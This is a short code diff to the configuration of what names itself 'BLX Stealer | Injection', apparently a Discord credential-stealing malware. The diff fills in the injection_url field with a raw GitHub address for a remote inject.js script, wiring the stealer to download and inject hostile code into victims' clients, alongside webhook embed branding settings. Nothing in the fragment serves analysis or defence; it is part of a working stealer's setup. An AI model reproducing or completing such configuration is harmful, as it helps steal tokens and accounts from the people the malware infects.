@@ -14,7 +14,7 @@ const config = {
   embed_name: 'BLX Stealer | Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg'.replace(/ /g, '%20'), 
   embed_color: 0x812118, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/blxstealr/Injection-for-BLX-Stealer/main/inject.js', 
   /**
    
    **/
